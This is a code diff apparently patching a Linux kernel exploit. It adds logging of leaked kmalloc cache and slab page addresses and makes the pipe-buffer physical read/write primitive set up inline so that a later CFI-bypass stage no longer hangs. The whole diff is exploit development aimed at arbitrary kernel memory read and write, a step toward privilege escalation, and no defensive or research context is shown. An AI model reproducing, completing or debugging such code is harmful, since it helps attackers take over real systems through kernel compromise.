@@ -364,6 +364,13 @@ int pipe_reclaim_cache_gate(int fd) {
   memset(cache_slots, 0, sizeof(cache_slots));
   uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
   kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
+  pr_info("phys gate caches=%016zx s0=%016llx s10=%016llx s11=%016llx cg10=%016llx cg11=%016llx\n",
+          kmalloc_caches,
+          (unsigned long long)cache_slots[0],
+          (unsigned long long)cache_slots[10],
+          (unsigned long long)cache_slots[11],
+          (unsigned long long)cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10],
+          (unsigned long long)cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11]);
   kmalloc_normal_1k_cache =
     cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
   kmalloc_normal_2k_cache =
@@ -383,6 +390,8 @@ int pipe_reclaim_cache_gate(int fd) {
     uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
     pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
     pipe_page_type[off / PAGE_SIZE] = page_type;
+    pr_info("phys gate page=%016zx head=%016zx cache=%016llx type=%08x\n",
+            page, head, (unsigned long long)slab_cache, page_type);
     int cache_match = pipe_cache_matches(slab_cache);
     if (off == 0 || cache_match) {
       candidate_slab_cache = slab_cache;
@@ -614,11 +623,17 @@ int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
 
 int install_pipe_physrw(int fd) {
   if (pipebuf_page_base == 0) {
-    atomic_store(&pipe_prepare_done, 0);
-    atomic_store(&pipe_prepare_request, 1);
-    while (!atomic_load(&pipe_prepare_done)) {
-      usleep(10000);
+    /* There is no background service for pipe_prepare_request in this tree.
+     * Prepare the pipe page inline; otherwise try_cfi_stage hangs forever. */
+    pr_info("phys step preparing pipe page inline\n");
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    atomic_store(&pipe_prepare_request, 0);
+    atomic_store(&pipe_prepare_done, 1);
+    if (!pipebuf_page_base) {
+      pr_warning("phys step pipe page prepare failed\n");
+      return 0;
     }
+    pr_info("phys step pipe page ready base=%016zx\n", pipebuf_page_base);
   }
 
   uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
